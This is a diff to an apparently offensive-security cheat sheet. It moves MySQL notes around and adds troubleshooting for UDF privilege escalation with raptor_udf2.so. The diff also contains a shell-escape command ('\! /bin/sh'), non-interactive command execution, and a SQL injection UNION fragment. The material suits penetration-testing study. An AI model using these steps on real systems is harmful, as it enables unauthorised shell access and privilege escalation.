@@ -430,14 +430,14 @@ param='union SELECT col1, col2, colN FROM (SELECT ROWNUM r, col1, col2 FROM TABL
 
 [MySQL commands cheatsheet](http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm)
 
-Ways to perform MySQL privesc (maybe move to privesc section).
-
 Execute commands non-interactively
 * `mysql -u root -p[password] mysql -e "[mysql_command]"`
 * `mysql -u root -p[password] mysql -e "SHOW VERSION();"`
 
 Drop into shell non-interactively
 * `mysql -u root -p[assword mysql -e "\! /bin/sh"`
+
+See "Mysql UDF" in privesc section for privilege escalation techniques.
 
 ### Apache James Mail Server [4555 TCP]
 
@@ -632,6 +632,15 @@ Replace root password hash
 Mysql UDF privilege escalation.
 * https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
 * https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/
+
+If you get the below error, simply replace `/usr/lib/mysql/plugin/raptor_udf2.so` with the `raptor_udf2.so` file you created originally.
+```
+mysql> create function do_system returns integer soname ’raptor_udf2.so’ ;
+ERROR 1126 (HY000) : Can’t open shared library ’raptor_udf2.so’ (errno : 0 /usr/lib/mysql/plugin/raptor_udf2.so : file too short)
+```
+
+If you cannot execute commands interactively, exec interactively by:
+* `mysql -u root -p[password] mysql -e "[mysql_command]"`
 
 
 ### NFS 'NO_ROOT_SQUASH' Misconfiguration
